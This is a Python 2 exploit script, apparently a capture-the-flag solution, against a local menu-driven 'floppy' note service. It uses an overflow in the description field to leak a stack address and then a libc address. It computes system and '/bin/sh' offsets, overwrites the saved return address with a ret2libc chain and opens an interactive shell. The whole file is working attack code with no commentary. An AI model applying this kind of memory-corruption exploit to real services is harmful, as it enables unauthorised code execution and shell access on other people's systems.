import socket, struct, telnetlib
import re


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu():
    read_until(f, '>\n')

def choose(f_id):
    print 'Choose'
    skip_menu()
    f.write('1' + '\n')
    f.write(str(f_id) + '\n')

def write(data, desc):
    print 'Write'
    skip_menu()
    f.write('2' + '\n')
    read_until(f, 'Input your data: \n')
    f.write(data + '\n')
    read_until(f, 'Description: \n')
    f.write(desc + '\n')


desc_pat = re.compile(r'DESCRIPTION: (.*)\nDATA:')
data_pat = re.compile(r'DATA: (.*)\n+=')
def read():
    print 'Read'
    skip_menu()
    f.write('3' + '\n')
    read_until(f, 'FLOPPY')
    data_read = read_until(f, '=\n')
    print data_read
    desc = desc_pat.search(data_read).group(1)
    data = data_pat.search(data_read).group(1)
    return (desc, data)


def modify(edit_id, data):
    print 'Modify'
    skip_menu()
    f.write('4' + '\n')
    read_until(f, '2 Data\n')
    f.write(str(edit_id)  + '\n')
    read_until(f, 'Input ')
    f.write(data + '\n')


def exit_():
    print 'Exit'
    skip_menu()
    f.write('5' + '\n')


s, f = sock("127.0.0.1", 4088)

choose(1)
write('AAAA', 'BBBB')
modify(1, 'C' * 16)
desc, data = read()
addr_ret_addr = u(desc[16:16+4]) + 0x28 + 0x10
print '[+] addr_ret_addr = {}'.format(hex(addr_ret_addr))

choose(2)
write('DDDD', 'EEEE')
modify(1, 'F' * 0x14 + p(addr_ret_addr))
choose(1)
desc, data = read()
print (desc, data)
addr_libc_start_main = u(data[:4]) - 247
addr_libc_base = addr_libc_start_main - 0x18540
print '[+] addr_libc_start_main = {}'.format(hex(addr_libc_start_main))
print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))
addr_system = addr_libc_base + 0x3ada0
addr_binsh = addr_libc_base + 0x15ba0b

buf = ''
buf += p(addr_system)
buf += p(0xdeadbeaf)
buf += p(addr_binsh)

choose(2)
modify(1, 'G' * 0x14 + p(addr_ret_addr))
choose(1)
modify(2, buf)
exit_()


shell(s)
